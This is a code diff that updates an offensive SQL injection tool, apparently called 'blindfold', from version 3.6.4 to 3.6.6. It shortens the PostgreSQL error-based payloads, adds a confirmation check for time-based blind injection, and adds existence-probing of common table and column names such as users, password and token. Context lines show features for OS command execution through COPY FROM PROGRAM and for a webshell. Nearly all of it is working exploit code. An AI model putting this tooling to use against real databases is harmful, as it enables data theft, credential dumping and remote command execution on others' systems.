@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.4"
+VERSION = "3.6.6"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -172,18 +172,21 @@ class Postgres(Dbms):
     def sleep_stacked(self, cond, sleep):
         return f"SELECT pg_sleep({sleep}) WHERE {cond}"
     def error_expr(self, inner):
-        # cast the value straight to int: a non-numeric value fails and the error quotes it.
-        # No delimiter wrapper, so the payload is short enough to survive a length-capped
-        # point (mirrors a hand-written  ' AND 1=CAST((..) AS int)--  exactly).
-        return f"1=CAST(({inner}) AS int)"
+        # PG '::int' is shorter than CAST(.. AS int): a non-numeric value fails the cast and
+        # the error quotes it. The leaner the payload, the better it survives a length cap.
+        return f"({inner})::int=1"
     def error_expr_forced(self, inner):
         # a purely numeric value casts cleanly (no error); '~' forces the failure.
-        return f"1=CAST(('~'||({inner})) AS int)"
+        return f"('~'||({inner}))::int=1"
     def error_value(self, text):
         # read the value from the integer-cast error itself. Anchoring to that message
         # (not a bare delimiter) means a query echoed back in the page can't fool us.
         m = re.search(r'invalid input syntax for (?:type )?integer:\s*"~?(.*?)"', text)
         return m.group(1) if m else None
+    def q_tables(self):
+        # pg_stat_user_tables lists ONLY user tables (no system noise) and is far shorter than
+        # the information_schema query, so it fits moderate length caps in a single request.
+        return "SELECT string_agg(relname,',') FROM pg_stat_user_tables"
     # RCE: COPY ... FROM PROGRAM (superuser) for exec; COPY (...) TO for webshell.
     can_exec = True
     can_webshell = True
@@ -635,6 +638,19 @@ class TimeOracle(Oracle_):
         n = self.a.retries + 1
         slow = sum(self.t.send(self._payload(cond)).elapsed >= self.thresh for _ in range(n))
         return slow * 2 > n
+    def confirmed(self):
+        """Detection gate: a REAL time-based injection makes the TRUE payload take ~sleep
+        longer than the FALSE payload of the same shape. Compare them directly (relative, not
+        an absolute baseline) and require a clear, repeated gap — so overall server slowdown
+        cancels out and a one-off jitter spike can't fake a hit. Same request budget as before."""
+        gap = self.a.sleep * 0.6
+        f0 = self.t.send(self._payload(FALSE_COND)).elapsed
+        t0 = self.t.send(self._payload(TRUE_COND)).elapsed
+        if t0 - f0 < gap:                 # no conditional delay -> reject early (2 requests)
+            return False
+        f1 = self.t.send(self._payload(FALSE_COND)).elapsed
+        t1 = self.t.send(self._payload(TRUE_COND)).elapsed
+        return (min(t0, t1) - max(f0, f1)) >= gap     # both TRUEs must beat both FALSEs by the gap
 
 
 # ===========================================================================
@@ -750,9 +766,7 @@ def find_time(target, a, contexts, candidates):
                 continue
             print(f"[*] time probe    : {d.name}/{ctx.name} ...", flush=True)
             o = TimeOracle(target, d, ctx, a)
-            if o.fires(FALSE_COND):          # always-slow? not conditional
-                continue
-            if o.fires(TRUE_COND):
+            if o.confirmed():                # TRUE sleeps ~self.sleep longer than FALSE, repeated
                 print(f"[+] time-based fires: {d.name}/{ctx.name}")
                 return d, ctx
     return None, None
@@ -1028,26 +1042,85 @@ def _split_list(s):
     return [x for x in re.split(r",", s or "") if x != ""]
 
 
+# ---- gentle fallback enumeration (used ONLY when a schema query can't fit a length cap) ----
+# Deliberately small, curated lists — not a sqlmap-sized wordlist. The point of blindfold is
+# to stay quiet and surgical; this only runs when the proper query is physically too long.
+COMMON_TABLES = ["users", "user", "accounts", "account", "admin", "admins", "members",
+    "customers", "customer", "clients", "people", "employees", "staff", "logins",
+    "credentials", "profiles", "sessions", "products", "orders", "posts", "messages",
+    "settings", "tokens", "data"]
+COMMON_COLUMNS = ["username", "user", "name", "login", "password", "passwd", "pass", "pwd",
+    "email", "mail", "id", "role", "is_admin", "admin", "secret", "token", "hash",
+    "first_name", "last_name", "created"]
+
+
+def _load_wordlist(path):
+    if not path:
+        return []
+    try:
+        with open(path, encoding="utf-8", errors="ignore") as fh:
+            return [ln.strip() for ln in fh if ln.strip() and not ln.lstrip().startswith("#")]
+    except OSError as e:
+        print(f"[!] --wordlist: {e}")
+        return []
+
+
+def _exists(target, det, expr):
+    """One tiny request: True unless the DB said the object doesn't exist. The payload
+    (' AND EXISTS(SELECT <expr>)-- -') is short, so it fits even very tight length caps."""
+    ctx, dbms = det.ctx, det.dbms
+    p = f"{ctx.close}{ctx.logic}EXISTS(SELECT {expr}){dbms.comment}"
+    return "does not exist" not in target.send(p).text.lower()
+
+
+def guess_names(target, det, a, table=None):
+    """Gently probe a small set of common names by existence — the only way to enumerate when
+    the proper schema query is too long for the injection point's length cap. Announced, and
+    bounded to a curated list (+ optional --wordlist), to stay true to blindfold's quiet style."""
+    base = COMMON_COLUMNS if table else COMMON_TABLES
+    names = list(dict.fromkeys(base + _load_wordlist(getattr(a, "wordlist", None))))
+    what = f"column names in '{table}'" if table else "table names"
+    print(f"[*] schema query won't fit the length cap — gently probing {len(names)} common "
+          f"{what} by existence ...", flush=True)
+    found = []
+    for n in names:
+        expr = (f"{det.dbms.quote_ident(n)} FROM {det.dbms.quote_ident(table)}"
+                if table else f"1 FROM {det.dbms.quote_ident(n)}")
+        try:
+            if _exists(target, det, expr):
+                found.append(n)
+                print(f"    [+] {'column' if table else 'table'} exists: {n}")
+        except RequestError:
+            break
+    return found
+
+
 def map_mode(target, det, a):
     db = read_scalar(target, det, a, det.dbms.q_current_db())
     tables = _split_list(read_scalar(target, det, a, det.dbms.q_tables()))
+    probed = False
+    if not tables and det.technique == "error-based":      # short query still didn't fit the cap
+        tables = guess_names(target, det, a)
+        probed = True
     print("\n=== DATABASE MAP ===")
     print(f"DBMS     : {det.dbms.name}")
     print(f"Database : {db}")
-    print(f"Tables   : {len(tables)}")
+    print(f"Tables   : {len(tables)}" + ("  (probed common names — not exhaustive)" if probed and tables else ""))
     for t in tables:
         print(f"  - {t}")
-    if det.technique == "error-based" and not tables:
-        print("[!] no tables read — schema queries are long and this point looks length-capped.")
-        print('    extract directly, e.g.:  --query "SELECT password FROM users LIMIT 1"')
+    if not tables:
+        print("[!] no tables found: the point is length-capped and no common name matched.")
+        print('    target a known table directly (--dump users), or pass --wordlist FILE.')
     print(f"\n[i] dump a table with:  --dump <table>   (rows capped by --max-rows)")
 
 
 def dump_mode(target, det, a):
     table = a.dump
     cols = _split_list(read_scalar(target, det, a, det.dbms.q_columns(table)))
+    if not cols and det.technique == "error-based":        # column query too long for the cap
+        cols = guess_names(target, det, a, table=table)
     if not cols:
-        print(f"[!] no columns found for '{table}' (wrong name or schema?)")
+        print(f"[!] no columns found for '{table}' (wrong name, or length-capped — try --wordlist)")
         return
     raw = read_scalar(target, det, a, det.dbms.q_count(table)) or "0"
     count = int(re.sub(r"[^0-9]", "", raw) or "0")
@@ -1240,6 +1313,8 @@ def main():
     act.add_argument("--query", help="extract a single SQL scalar (power mode)")
     act.add_argument("--dump", metavar="TABLE", help="dump rows of TABLE (columns auto-discovered)")
     act.add_argument("--max-rows", type=int, default=50, dest="max_rows", help="row cap for --dump (default 50)")
+    act.add_argument("--wordlist", metavar="FILE",
+                     help="extra candidate names for gentle table/column probing on capped points")
     act.add_argument("--rce", nargs="?", const=RCE_SHELL, metavar="CMD",
                      help="OS command via the DBMS (no CMD = interactive shell). Authorized use only")
     act.add_argument("--webshell", action="store_true",
